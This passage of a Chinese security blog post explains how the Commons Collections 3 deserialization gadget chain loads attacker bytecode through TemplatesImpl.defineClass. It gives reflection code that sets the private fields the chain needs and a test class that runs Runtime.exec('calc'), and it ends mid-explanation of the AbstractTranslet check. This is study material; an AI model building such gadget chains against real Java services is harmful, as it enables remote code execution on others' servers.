<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>CCé“¾3 | Hao's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=undefined"><link rel="stylesheet" type="text/css" href="https://unpkg.com/normalize.css"><link rel="stylesheet" type="text/css" href="https://unpkg.com/purecss/build/pure-min.css"><link rel="stylesheet" type="text/css" href="https://unpkg.com/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="https://unpkg.com/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="https://unpkg.com/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="https://unpkg.com/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="https://unpkg.com/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="https://unpkg.com/toastr/build/toastr.min.css"><div class="darkmode-toggle">ğŸŒ“</div><script>var prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)');
var toggle = document.querySelector('.darkmode-toggle');
var html = document.querySelector('html');

html.dataset.dark = localStorage.dark || prefersDarkMode.matches;

toggle.addEventListener('click', () => {
localStorage.dark = !(html.dataset.dark == 'true');
html.dataset.dark = localStorage.dark;
});</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CCé“¾3</h1><a id="logo" href="/.">Hao's Blog</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> é¦–é¡µ</i></a><a href="/archives/"><i class="fa fa-archive"> å½’æ¡£</i></a><a href="/about/"><i class="fa fa-user"> å…³äº</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CCé“¾3</h1><div class="post-meta">2025-09-07<span> | </span><span class="category"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Javaå®‰å…¨</a></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">æ–‡ç« ç›®å½•</div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CC%E9%93%BE3"><span class="toc-number">1.</span> <span class="toc-text">CCé“¾3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CC3%E9%93%BE%E4%B8%AD%E4%BD%BF%E7%94%A8%E7%9A%84%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6"><span class="toc-number">2.</span> <span class="toc-text">CC3é“¾ä¸­ä½¿ç”¨çš„åŠ¨æ€ç±»åŠ è½½æœºåˆ¶</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">3.</span> <span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%84%E9%80%A0TemplatesImpl%E7%B1%BB%E4%B8%AD%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE%E7%9A%84payload"><span class="toc-number">4.</span> <span class="toc-text">æ„é€ TemplatesImplç±»ä¸­çš„è°ƒç”¨é“¾çš„payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CC1%E4%B8%8ETemplatesImpl%E7%9A%84%E7%BB%93%E5%90%88"><span class="toc-number">5.</span> <span class="toc-text">CC1ä¸TemplatesImplçš„ç»“åˆ</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TrAXFilter"><span class="toc-number">6.</span> <span class="toc-text">TrAXFilter</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#InstantiateTransformer"><span class="toc-number">7.</span> <span class="toc-text">InstantiateTransformer</span></a></li></ol></div></div><div class="post-content"><h1 id="CCé“¾3"><a href="#CCé“¾3" class="headerlink" title="CCé“¾3"></a>CCé“¾3</h1><p>å‰é¢ä»‹ç»äº†CC1å’ŒCC6ï¼Œè¿™ä¸¤æ¡é“¾å­è™½ç„¶å‰é¢çš„å…¥å£ç±»ä¸åŒ</p>
<ul>
<li>CC1å…¥å£ç±»æ˜¯AnnotationInvocationHandler</li>
<li>CC6å…¥å£ç±»æ˜¯HashMap<br>ä½†æ˜¯å…¶è§¦å‘æ¶æ„ä»£ç çš„æ–¹å¼æ˜¯ç›¸åŒçš„ï¼Œéƒ½æ˜¯InvokerTransformer.transform()è§¦å‘Runtime.getRuntime().exec()å®ç°å‘½ä»¤æ‰§è¡Œã€‚</li>
</ul>
<p>è€Œåœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼ŒRuntime.getRuntime().exec()æ–¹å¼ä¼šè¢«æœåŠ¡å™¨æ‰€ç¦æ­¢ï¼ˆä»£ç é»‘åå•ï¼‰ï¼Œå¯¼è‡´æœ€ç»ˆåˆ©ç”¨é“¾æ— æ³•æ‰§è¡Œã€‚</p>
<p>CCé“¾3å…¶å®æ˜¯åœ¨è°ƒç”¨Runtime.exec()çš„å¦ä¸€ç§æ–¹å¼ï¼Œé€šè¿‡ç±»åŠ è½½çš„å½¢å¼åŠ¨æ€åŠ è½½æ¶æ„ç±»æ¥å®ç°è‡ªåŠ¨æ‰§è¡Œæ¶æ„ç±»ä»£ç çš„</p>
<h1 id="CC3é“¾ä¸­ä½¿ç”¨çš„åŠ¨æ€ç±»åŠ è½½æœºåˆ¶"><a href="#CC3é“¾ä¸­ä½¿ç”¨çš„åŠ¨æ€ç±»åŠ è½½æœºåˆ¶" class="headerlink" title="CC3é“¾ä¸­ä½¿ç”¨çš„åŠ¨æ€ç±»åŠ è½½æœºåˆ¶"></a>CC3é“¾ä¸­ä½¿ç”¨çš„åŠ¨æ€ç±»åŠ è½½æœºåˆ¶</h1><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œå®æˆ˜ä¸­ä½¿ç”¨åŠ¨æ€ç±»åŠ è½½æœºåˆ¶åŠ è½½æ¶æ„ç±»çš„æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p>
<ul>
<li>URLClassLoader ä»»æ„ç±»åŠ è½½</li>
<li>ClassLoader.defineClass å­—èŠ‚ç åŠ è½½ä»»æ„ç±»ï¼ˆç§æœ‰æ–¹æ³•ï¼‰</li>
<li>Unsafe.defineClass å­—èŠ‚ç åŠ è½½ï¼ˆå…¬æœ‰æ–¹æ³•ï¼‰ï¼Œä½†ç±»ä¸èƒ½ç›´æ¥ç”Ÿæˆï¼ŒSpringä¸­å¯ä»¥ç›´æ¥ç”Ÿæˆ</li>
</ul>
<p>è€ŒCC3é“¾åˆ™æ˜¯åˆ©ç”¨çš„ClassLoader.defineClass å­—èŠ‚ç åŠ è½½ä»»æ„ç±»ï¼ˆç§æœ‰æ–¹æ³•ï¼‰</p>
<p>ClassLoader.defineClass å­—èŠ‚ç åŠ è½½ä»»æ„ç±»æ–¹å¼ä¸ºï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–ä¸€ä¸ªclassLoaderå¯¹è±¡</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"><span class="comment">// é€šè¿‡åå°„è·å–åˆ°ClassLoadç±»ä¸­çš„defineClassæ–¹æ³•å¯¹è±¡</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// Testç±»çš„å­—èŠ‚ç </span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;Test.classæ–‡ä»¶è·¯å¾„&quot;</span>));</span><br><span class="line"><span class="comment">// ç›¸å½“äºæ‰§è¡Œäº† cl.defineClass(&quot;Test&quot;,code,0,code.length)ï¼Œå³é€šè¿‡å­—èŠ‚ç åˆ›å»ºäº†ä¸€ä¸ªåä¸ºTestçš„ç±»</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(cl,<span class="string">&quot;Test&quot;</span>,code,<span class="number">0</span>,code.length);</span><br><span class="line"><span class="comment">// å¯¹Testç±»å®ä¾‹åŒ–</span></span><br><span class="line"><span class="type">Test</span> <span class="variable">testObj</span> <span class="operator">=</span> c.newInstance();</span><br></pre></td></tr></table></figure>

<h1 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h1><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-07%20234925.png"><br>é€šè¿‡defineClass()æ–¹æ³•å¯ä»¥åŠ è½½ä¸€ä¸ªç±»å­—èŠ‚ç ï¼Œç”Ÿæˆä¸€ä¸ªç±»å¯¹è±¡ã€‚å¦‚æœç±»å­—èŠ‚ç ä¸­å­˜åœ¨æ¶æ„çš„å†…å®¹ï¼Œåˆ™ä¼šæ‰§è¡Œã€‚</p>
<p>æ¥ä¸‹æ¥å¯»æ‰¾ä¸€ä¸‹å“ªé‡Œè°ƒç”¨äº†defineClass()æ–¹æ³•ï¼Œå’Œå…¶ä»–åˆ©ç”¨é“¾ä¸€æ ·ï¼Œæœ€ç»ˆéœ€è¦æ‰¾åˆ°readObject()ã€‚</p>
<p>åœ¨defineTransletClasses()ä¸­çœ‹åˆ°äº†è°ƒç”¨defineClass()æ–¹æ³•<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-07%20235129.png"><br>ä½†ç”±äºç§æœ‰çš„ï¼Œæ‰€ä»¥å†æŸ¥æ‰¾è°è°ƒç”¨äº†defineTransletClasses()</p>
<p>åœ¨ä¸‹é¢çš„getTransletInstance()æ–¹æ³•æ‰¾åˆ°äº†è°ƒç”¨<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-07%20235314.png"><br>ä½†ä¾æ—§ç§æœ‰ï¼Œç»§ç»­æ‰¾</p>
<p>æœ€ååœ¨newTransformer()ä¸­æ‰¾åˆ°äº†ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯public<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-07%20235441.png"></p>
<p>æ­¤æ—¶çš„è°ƒç”¨é“¾ä¸ºï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader.defineClass</span><br><span class="line">java.lang.ClassLoader#defineClass</span><br></pre></td></tr></table></figure>

<h1 id="æ„é€ TemplatesImplç±»ä¸­çš„è°ƒç”¨é“¾çš„payload"><a href="#æ„é€ TemplatesImplç±»ä¸­çš„è°ƒç”¨é“¾çš„payload" class="headerlink" title="æ„é€ TemplatesImplç±»ä¸­çš„è°ƒç”¨é“¾çš„payload"></a>æ„é€ TemplatesImplç±»ä¸­çš„è°ƒç”¨é“¾çš„payload</h1><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ„é€ ä¸€ä¸‹å½“å‰çš„è°ƒç”¨é“¾çš„payloadï¼Œä½¿å…¶è°ƒç”¨TemplatesImpl.newTransformer()æ—¶ï¼ŒåŠ è½½æ¶æ„ç±»ï¼Œè§¦å‘æ¶æ„ä»£ç ã€‚</p>
<p>é€šè¿‡åˆšæ‰çš„åˆ†æï¼Œå½“è°ƒç”¨åˆ°newTransformer()æ–¹æ³•æ—¶ï¼Œä¼šè§¦å‘ä¸€ç³»åˆ—çš„è°ƒç”¨ï¼Œå½“ç„¶ï¼Œæˆ‘ä»¬è¦è§£å†³ä¸­é—´çš„ä¸€äº›â€œé˜»ç¢â€ã€‚</p>
<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªTemplatesImplå¯¹è±¡ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥è°ƒç”¨newTransformer()æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶è¿è¡Œä»£ç ï¼Œå¹¶ä¸ä¼šæ‰§è¡Œæ¶æ„ä»£ç ï¼Œå› ä¸ºæˆ‘ä»¬è¿æ¶æ„ç±»å­—èŠ‚ç è¿˜æ²¡å‘¢ï¼æ­¤æ—¶åªæ˜¯è°ƒç”¨äº†newTransformer()æ–¹æ³•è€Œå·²ï¼Œè°ƒç”¨é“¾å¹¶ä¸èƒ½æˆåŠŸæ‰§è¡Œä¸‹å»ã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¼€å¤´å’Œç»“å°¾å·²ç»æœ‰äº†ï¼Œæ¥ä¸‹æ¥éœ€è¦åœ¨ä¸­é—´å°†å‚æ•°ã€é™åˆ¶æ¡ä»¶ç­‰è§£å†³æ‰ã€‚</p>
<p>å‡å¦‚ç°åœ¨æˆ‘ä»¬å·²ç»æ‰§è¡Œäº†newTransformer()æ–¹æ³•ï¼Œé‚£ä¹ˆåˆ°åº•æ˜¯ä»€ä¹ˆå†…å®¹é™åˆ¶äº†è°ƒç”¨é“¾çš„æˆåŠŸæ‰§è¡Œå‘¢ï¼Ÿ</p>
<p>é¦–å…ˆè°ƒç”¨newTransformer()æ–¹æ³•åï¼Œæˆ‘ä»¬é€šè¿‡è°ƒç”¨é“¾å¾—çŸ¥ï¼Œæ¥ä¸‹æ¥éœ€è¦è°ƒç”¨TemplatesImpl.getTransletInstance()æ–¹æ³•ï¼Œè€Œåœ¨newTransformer()æ–¹æ³•å†…éƒ¨å¯ä»¥å‘ç°ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆå¯ä»¥é˜»ç¢ä»£ç æ‰§è¡Œåˆ°getTransletInstance()æ–¹æ³•<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-07%20235441.png"><br>æ¥ä¸‹æ¥ï¼Œæ˜¯éœ€è¦è°ƒç”¨TemplatesImpl.defineTransletClasses()æ–¹æ³•ï¼Œè¿›å…¥getTransletInstance()æ–¹æ³•çœ‹ä¸€ä¸‹ï¼š<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-07%20235314.png"><br>ä»è¿™é‡Œå¯ä»¥å‘ç°ï¼Œè¿™é‡Œæœ‰ä¸¤é“åï¼Œä¸€ä¸ªæ˜¯_nameï¼Œä¸€ä¸ªæ˜¯_classï¼Œæˆ‘ä»¬éœ€è¦æ»¡è¶³ï¼š</p>
<ul>
<li>_name ä¸èƒ½ä¸ºnull</li>
<li>_classå¿…é¡»æ˜¯null</li>
</ul>
<p>å› ä¸ºè¿™äº›å±æ€§é»˜è®¤å°±æ˜¯nullï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»™_nameèµ‹å€¼ï¼Œä½¿å…¶ä¸æ˜¯nullã€‚</p>
<p>é€šè¿‡æŸ¥çœ‹_nameå±æ€§åœ¨è¯¥ç±»ä¸­çš„èµ‹å€¼æƒ…å†µï¼Œå‘ç°å¹¶ä¸å¥½èµ‹å€¼ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬é€šè¿‡åå°„ï¼Œç»™_nameå±æ€§èµ‹å€¼</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">_name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">_nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">_nameField.set(templates,<span class="string">&quot;aaa&quot;</span>); </span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶è¿è¡Œï¼Œè¿˜æ˜¯æ‰§è¡Œä¸æˆåŠŸã€‚å› ä¸ºåé¢è¿˜æ˜¯æœ‰åˆ«çš„é™åˆ¶çš„ï¼Œç»§ç»­åˆ†æ</p>
<p>ç°åœ¨èƒ½æˆåŠŸè°ƒç”¨defineTransletClasses()æ–¹æ³•äº†ï¼Œæ ¹æ®è°ƒç”¨é“¾å¾—çŸ¥ï¼Œæ¥ä¸‹æ¥éœ€è¦è°ƒç”¨TransletClassLoader.defineClass()æ–¹æ³•ã€‚</p>
<p>è¿›å…¥åˆ°defineTransletClasses()æ–¹æ³•å†…éƒ¨ï¼š<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-08%20000642.png"><br>å‘ç°ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªé™åˆ¶ï¼Œå°±æ˜¯_bytecodeså±æ€§ï¼Œä¸èƒ½ä¸ºç©ºï¼Œå¦åˆ™æŠ¥å¼‚å¸¸ã€‚</p>
<p>çœ‹çœ‹_bytecodeså±æ€§ï¼Œå‘ç°æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
<p>å¹¶ä¸”åœ¨è°ƒç”¨defineClass()æ–¹æ³•çš„ä½ç½®ï¼Œ_bytecodes[i]ä¼šå½“åšdefineClass()æ–¹æ³•çš„å‚æ•°ä¼ å…¥ã€‚<br>ä¸€æ­¥æ­¥è¿›å…¥defineClass()æ–¹æ³•åä¼šå‘ç°ï¼Œæœ€åè°ƒç”¨äº†ClassLoader.defineClass()ï¼Œå½“ç„¶è¿™é‡Œå°±æ˜¯å‰é¢æ‰€è¯´çš„è°ƒç”¨é“¾ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬å…³æ³¨_bytecodes[i]å‚æ•°ï¼Œæœ€ç»ˆä¼šæˆä¸ºClassLoader.defineClass()æ–¹æ³•çš„byte[] bï¼Œä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆé€šè¿‡defineClassæ–¹å¼åŠ è½½çš„ç±»å­—èŠ‚ç ã€‚</p>
<p>è¿™é‡Œå…ˆå‡†å¤‡ä¸ª.classçš„æ¶æ„æ–‡ä»¶ï¼š<br>åˆ›å»ºæ¶æ„ç±»,å¹¶å°†å…¶ç¼–è¯‘æˆclassæ–‡ä»¶</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‡†å¤‡å¥½.classæ–‡ä»¶ä¹‹åï¼Œæ¥ä¸‹æ¥ç»™_bytecodeså±æ€§èµ‹å€¼ï¼Œæ³¨æ„å®ƒæ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œä¼ å…¥defineClass()æ–¹æ³•çš„æ˜¯_bytecodes[i]ï¼Œæ‰€ä»¥æˆ‘ä»¬åŠ è½½çš„.classæ–‡ä»¶çš„å­—èŠ‚ç å†…å®¹ï¼Œåº”è¯¥æ”¾åœ¨_bytecodes[i]å¤„ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">_bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">_bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\_JavaProject\\temp\\Test.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;</span><br><span class="line">_bytecodesField.set(templates,codes); </span><br></pre></td></tr></table></figure>

<p>defineTransletClasses()æ–¹æ³•ä¸­ç”¨åˆ°çš„_tfactoryä¹Ÿä¸èƒ½ä¸ºnull<br>æŸ¥çœ‹ä¸€ä¸‹_tfactoryçš„ç±»å‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
<p>å‘ç°æ˜¯TransformerFactoryImplç±»å‹ï¼Œä½†æ˜¯è¢«transientä¿®é¥°ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½è¿›è¡Œåºåˆ—åŒ–ã€‚<br>ä½†æ˜¯åœ¨é‡å†™çš„readObject()æ–¹æ³•ä¸­å­˜åœ¨_tfactoryèµ‹å€¼ï¼š<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-08%20001026.png"><br>æ„å‘³ç€ï¼Œå³ä½¿æˆ‘ä»¬æ²¡æœ‰å°†_tfactoryåºåˆ—åŒ–è¿›å»ï¼Œä½†æ˜¯æ‰§è¡ŒreadObject()å³ååºåˆ—çš„æ—¶å€™ï¼ŒåŒæ ·ä¼šç»™_tfactoryèµ‹å€¼ï¼è¿™æ ·å°±ä¸ç”¨æ‹…å¿ƒ_tfactoryä¸ºnulläº†ã€‚<br>ç»™_tfactoryèµ‹å€¼ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">_tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">_tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">_tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>

<p>ä½†è¿™æ ·è¿è¡Œåå¼‚å¸¸æŠ¥é”™</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\java-test\\TemplatesImpl\\TemplatesImpl\\target\\classes\\com\\javatest\\Pay.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-08%20130414.png"><br>ç›´æ¥è·³è½¬åˆ°422è¡Œï¼Œå‘ç°åœ¨defineTransletClasses()æ–¹æ³•å†…æŠ¥é”™çš„</p>
<p>æ‰€ä»¥å¯¹å…¶è¿›è¡Œè°ƒè¯•ï¼ŒæŸ¥æ‰¾å“ªé‡Œå‡ºäº†é—®é¢˜<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-08%20130954.png"><br>å…³æ³¨æ­¤å¤„ä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;  <span class="comment">//_transletIndex = -1</span></span><br><span class="line"><span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç”±äº_transletIndex &#x3D; -1 æ‰€ä»¥è·³å…¥ä¸‹é¢çš„å¾ªç¯if (_transletIndex &lt; 0) å°±ä¼šè¿›è¡Œå¼‚å¸¸æŠ¥é”™<br>æŸ¥çœ‹ç¬¬ä¸€ä¸ªåˆ¤æ–­è¯­å¥superClass.getName().equals(ABSTRACT_TRANSLET)ä¸­çš„<strong>ABSTRACT_TRANSLET</strong><br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-08%20131601.png"><br>å‘ç°æ˜¯AbstractTransletç±»</p>
<p>ä»forå¾ªç¯æ¥çœ‹é€šå°†ä¼ å…¥çš„å­—èŠ‚ç æ¢æˆJavaç±»ï¼Œå¹¶é€šè¿‡getSuperclass()è·å–å…¶çˆ¶ç±»<br>åœ¨è¿›å…¥ifè¯­å¥å¯¹<strong>çˆ¶ç±»åå­—</strong>ä¸<strong>ABSTRACT_TRANSLET</strong>è¿›è¡Œæ¯”è¾ƒ</p>
